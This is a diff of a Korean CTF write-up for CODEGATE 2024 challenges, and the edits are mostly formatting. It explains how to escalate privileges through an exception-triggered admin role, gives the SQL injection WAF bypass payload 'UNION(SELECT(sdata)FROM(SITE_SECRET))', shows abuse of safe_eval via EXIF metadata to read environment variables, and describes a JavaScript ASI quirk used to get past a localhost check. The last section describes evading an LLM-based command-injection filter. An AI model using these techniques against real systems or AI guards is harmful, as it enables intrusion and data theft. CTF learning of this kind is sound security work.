@@ -12,13 +12,13 @@ draft: false
 
 ### ShieldOSINT
 
-총 3단계로 이루어진 문제이다. (플래그는 일반적으로는 접근 불가한 `SITE_SECRET` 테이블에 존재한다.)
+총 3단계로 이루어진 문제이다. (플래그는 일반적으로는 접근 불가한 **SITE_SECRET** 테이블에 존재한다.)
 
-1. 에러를 발생 시켜 권한 상승
+1. 에러를 발생시켜 권한 상승
 2. session 생성
-3. SQL Injection으로 flag 획득
+3. **SQL Injection**으로 **flag** 획득
 
-`Spring Boot`에서는 인증(로그인, 회원가입 등)이 성공하면, 하나의 핸들러를 거치게 된다.
+**Spring Boot**에서는 인증(로그인, 회원가입 등)이 성공하면, 하나의 핸들러를 거치게 된다.
 
 ```kotlin
 class ShieldCloud : AuthenticationSuccessHandler {
@@ -47,7 +47,7 @@ class ShieldCloud : AuthenticationSuccessHandler {
             } catch (e: JsonParseException) {
                 authorities.add(SimpleGrantedAuthority("ROLE_USER"))
             } catch (e: Exception) {
-                    authorities.add(SimpleGrantedAuthority("ROLE_ADMIN"))
+                authorities.add(SimpleGrantedAuthority("ROLE_ADMIN"))
             }
         } else {
             authorities.add(SimpleGrantedAuthority("ROLE_USER"))
@@ -66,11 +66,9 @@ class ShieldCloud : AuthenticationSuccessHandler {
 }
 ```
 
-위 코드를 보게 되면, `shieldParam`이 `true`일 경우 `ROLE_USER`를 부여하고, `JsonParseException`을 제외한 `Exception`이 발생한 경우 `ROLE_ADMIN`을 부여한다.
-즉, `ROLE_ADMIN`을 부여 받기 위해서는 `NullPointerException`을 발생시켜야 한다. (필요한 키인 `user_role`이 없는 경우 `NullPointerException`이 발생한다.)
+위 코드를 보면, **shieldParam**이 **true**일 경우 **ROLE_USER**를 부여하고, `JsonParseException`을 제외한 `Exception`이 발생한 경우 **ROLE_ADMIN**을 부여한다. 즉, **ROLE_ADMIN**을 부여받기 위해서는 **NullPointerException**을 발생시켜야 한다. (필요한 키인 **user_role**이 없는 경우 **NullPointerException**이 발생한다.)
 
-그러나, `ROLE_ADMIN`을 받기만 해서는 flag를 얻기 위한 어떠한 작업도 수행 할 수 없다.
-아래의 코드를 보면, flag을 얻을 수 있는 통로인 `/api/v6/shieldosint/search`에서 session이 없다면 `Session null`을 반환하기 때문이다.
+그러나, **ROLE_ADMIN**을 받기만 해서는 **flag**를 얻기 위한 어떠한 작업도 수행할 수 없다. 아래의 코드를 보면, **flag**를 얻을 수 있는 통로인 **/api/v6/shieldosint/search**에서 **session**이 없다면 **Session null**을 반환하기 때문이다.
 
 ```kotlin
 @RequestMapping("/api/v6/shieldosint")
@@ -147,10 +145,9 @@ class ApiController(private val userService: UserService) {
 }
 ```
 
-따라서, session을 생성하기 위해서 `/api/v6/shieldosint/query`에 `sessioncheck`를 `Y`로 보내면 된다.
+따라서, **session**을 생성하기 위해서 **/api/v6/shieldosint/query**에 **sessioncheck**를 **Y**로 보내면 된다.
 
-그리고 나면, 최종 관문인 `/api/v6/shieldosint/search`에서 SQL Injection을 통해 flag를 획득할 수 있다.
-아래의 코드를 보면 알겠지만, `/api/v6/shieldosint/search`에서 호출된 `ReflectionController`는 `DataProvider`의 메소드를 호출한다.
+그리고 나면, 최종 관문인 **/api/v6/shieldosint/search**에서 **SQL Injection**을 통해 **flag**를 획득할 수 있다. 아래의 코드를 보면 알겠지만, **/api/v6/shieldosint/search**에서 호출된 **ReflectionController**는 **DataProvider**의 메소드를 호출한다.
 
 ```kotlin
 class ReflectionController {
@@ -196,9 +193,7 @@ class ReflectionController {
 }
 ```
 
-즉, `/api/v6/shieldosint/search` -> `ReflectionController` -> `DataProvider` 순으로 호출되는데,
-`ReflectionController`에서 `DataProvider`의 메소드를 호출할 때, `mp`와 `query`에 따라 전달되는 인자가 달라진다.
-`magicParam`는 `type`을 나타내고, `query`는 `magicParam`에 따른 데이터를 나타낸다. 즉, `magicParam`를 `string`으로 지정하여, `query`의 3번째 단어에 `SQL Injection`을 할 쿼리를 넣으면 된다.
+즉, **/api/v6/shieldosint/search** -> **ReflectionController** -> **DataProvider** 순으로 호출되는데, **ReflectionController**에서 **DataProvider**의 메소드를 호출할 때, **mp**와 **query**에 따라 전달되는 인자가 달라진다. **magicParam**는 **type**을 나타내고, **query**는 **magicParam**에 따른 데이터를 나타낸다. 즉, **magicParam**을 **string**으로 지정하여, **query**의 3번째 단어에 **SQL Injection**을 할 쿼리를 넣으면 된다.
 
 ```kotlin
 fun filterQuery(query: String): String {
@@ -246,8 +241,7 @@ fun filterQuery(query: String): String {
     }
 ```
 
-이제 여기서 위 코드의 WAF를 우회해야 하는데 간단히 우회 할 수 있다.
-`UNION(SELECT(sdata)FROM(SITE_SECRET))`를 사용하면 된다!
+이제 여기서 위 코드의 **WAF**를 우회해야 하는데 간단히 우회할 수 있다. **UNION(SELECT(sdata)FROM(SITE_SECRET))**를 사용하면 된다!
 
 최종적인 익스 코드는 아래와 같다.
 
@@ -302,13 +296,11 @@ await instance
 	.then((v) => console.log(v.data.replace('Query Result: ', '')))
 ```
 
-~~플래그를 안적어뒀다 ㅠㅠ~~
+~~플래그를 안 적어뒀다 ㅠㅠ~~
 
 ### combination
 
-`docker-compose.yml`을 보게 되면, flag가 `environment`에 저장되어 있는 것을 확인 할 수 있다.
-또 `app.py`를 보면 누가 봐도 의심스러운 `safe_eval` 함수가 존재한다. 또한 이는, `/verify`에서 특정 조건을 만족하면 호출된다.
-그렇다면 `safe_eval` 함수를 통해 `os.environ`을 호출하여 flag를 획득하면 된다.
+**docker-compose.yml**을 보면, **flag**가 **environment**에 저장되어 있는 것을 확인할 수 있다. 또 **app.py**를 보면 누가 봐도 의심스러운 **safe_eval** 함수가 존재한다. 또한 이는 **/verify**에서 특정 조건을 만족하면 호출된다. 그렇다면 **safe_eval** 함수를 통해 **os.environ**을 호출하여 **flag**를 획득하면 된다.
 
 ```python
 @app.route('/verify', methods=['GET', 'TRACE'])
@@ -384,10 +376,9 @@ def verify_file():
             return jsonify({'error': 'Error processing image'}), 500
 ```
 
-위 코드를 보면 알겠지만, `/verify`의 조건을 만족시키기 위해서는 두개의 이미지가 필요하며 EXIF에 `CODEGATE2024\x00`가 존재해야 한다.
-그리고 `ImageDescription`에 `os.environ`을 호출하는 코드가 존재해야 한다.
+위 코드를 보면 알겠지만, **/verify**의 조건을 만족시키기 위해서는 두 개의 이미지가 필요하며 **EXIF**에 **CODEGATE2024\x00**가 존재해야 한다. 그리고 **ImageDescription**에 **os.environ**을 호출하는 코드가 존재해야 한다.
 
-따라서 아래의 코드를 통해 플래그를 획득 할 수 있다. ~~파이썬 너무 어려워요~~
+따라서 아래의 코드를 통해 **flag**를 획득할 수 있다. ~~파이썬 너무 어려워요~~
 
 ```python
 import piexif
@@ -431,13 +422,13 @@ with open('img1.jpeg', 'rb') as file_a, open('img2.jpeg', 'rb') as file_b:
     print(b.text)
 ```
 
-~~또 플래그를 안적어뒀다 ㅠㅠㅠㅠ~~
+~~또 플래그를 안 적어뒀다 ㅠㅠㅠㅠ~~
 
 ### dyson(upsolving)
 
-대회 당일날 6시간 가량 이 문제 잡다가 [ShieldOSINT](#shieldosint)와 [combination](#combination)를 잡았는데, 방향을 잘 잡았으면 풀지 않았을까 한다.
+대회 당일날 6시간가량 이 문제 잡다가 [ShieldOSINT](#shieldosint)와 [combination](#combination)를 잡았는데, 방향을 잘 잡았으면 풀지 않았을까 한다.
 
-먼저 `secret.js`를 봐보자.
+먼저 **secret.js**를 봐보자.
 
 ```javascript
 var g = require('dyson-generators')
@@ -485,10 +476,9 @@ module.exports = {
 }
 ```
 
-`/api/flagService`로 요청을 받으며, `localhost` 이면서 `SuperSecretPassword`와 `guessPassword`가 같거나, `realFlag`와 `guessFlag`가 같으면 플래그를 반환한다.
-그러나 이는 일반적으로는 우회가 불가능하다. `SuperSecretPassword`는 풀이자가 알 수 없도록 길 것이며, `realFlag`는 sha256으로 해싱되어 있을 거기 때문이다.
+**/api/flagService**로 요청을 받으며, **localhost**이면서 **SuperSecretPassword**와 **guessPassword**가 같거나, **realFlag**와 **guessFlag**가 같으면 **flag**를 반환한다. 그러나 이는 일반적으로는 우회가 불가능하다. **SuperSecretPassword**는 풀이자가 알 수 없도록 길 것이며, **realFlag**는 **sha256**으로 해싱되어 있을 거기 때문이다.
 
-일단 다른 정보들도 얻어보자. 먼저, `Dockerfile`을 보면 [dyson-demo](https://github.com/webpro/dyson-demo)를 가져오는 것을 알 수 있다. 이는 `dyson`을 활용한 앱임을 알 수 있으며, `dyson`은 `multi request`를 지원하는 라이브러리이다.
+일단 다른 정보들도 얻어보자. 먼저, **Dockerfile**을 보면 [dyson-demo](https://github.com/webpro/dyson-demo)를 가져오는 것을 알 수 있다. 이는 **dyson**을 활용한 앱임을 알 수 있으며, **dyson**은 **multi request**를 지원하는 라이브러리이다.
 
 ```javascript
 const http = require('http')
@@ -533,9 +523,9 @@ module.exports = {
 }
 ```
 
-이를 통해서 일단, `localhost` 필터링을 우회 할 수 있다.
+이를 통해서 일단, **localhost** 필터링을 우회할 수 있다.
 
-`secret.js`를 좀 자세히 보면, `;`이 안찍혀 있는 것을 알 수 있다.
+**secret.js**를 좀 자세히 보면, `;`이 안 찍혀 있는 것을 알 수 있다.
 
 ```javascript
 const SuperSecretPassword = ('[REDACTED]'[(guessPassword, guessFlag)] =
@@ -551,23 +541,20 @@ const SuperSecretPassword =
 		: ['idk', 'idk']
 ```
 
-는 ASI의 misbehavior로 인해, 같은 코드로 인식 된다.
-따라서, `http://url:port/user?,api/flagService?guess=`로 요청을 하면 flag을 얻을 수 있다. (물론 아래 사진과 같이, host를 변경해야 한다.)
+는 **ASI**의 misbehavior로 인해, 같은 코드로 인식된다. 따라서, **http://url:port/user?,api/flagService?guess=**로 요청을 하면 **flag**를 얻을 수 있다. (물론 아래 사진과 같이, **host**를 변경해야 한다.)
 
 ![dyson1](dyson1.png)
 
-대회때 multi request가 있는 것은 알았으나, ASI의 misbehavior를 이용한 우회는 생각하지 못했다.
-그래서 `npm audit` 돌려서 나온, prototype pollution만 엄청 시도해보고 있었다.
+대회 때 **multi request**가 있는 것은 알았으나, **ASI**의 misbehavior를 이용한 우회는 생각하지 못했다. 그래서 **npm audit** 돌려서 나온, **prototype pollution**만 엄청 시도해보고 있었다.
 
 ## Ai
 
 ### firewall
 
-문제 파일을 보게 되면, ai를 통해 cmd injection을 방지하려고 하는 것을 알 수 있다.
-그러나, cmd injection 필터링 명령을 system 프롬프트가 아닌 user 프롬프트를 통해 하기 때문에, 비교적 쉽게 우회를 할 수 있다.
+문제 파일을 보게 되면, **ai**를 통해 **cmd injection**을 방지하려고 하는 것을 알 수 있다. 그러나, **cmd injection** 필터링 명령을 **system** 프롬프트가 아닌 **user** 프롬프트를 통해 하기 때문에, 비교적 쉽게 우회할 수 있다.
 
 ![firewall1](firewall1.png)
 
-`codegate2024{1786d016ae1230e8d03e76c53c4a622098c72b73573d68979e167b45524407ed5c131c002342f44f664674fe91f2655a7a28}`
+**codegate2024{1786d016ae1230e8d03e76c53c4a622098c72b73573d68979e167b45524407ed5c131c002342f44f664674fe91f2655a7a28}**
 
-다른 문제들은 풀면 업데이트 하겠다.
+다른 문제들은 풀면 업데이트하겠다.
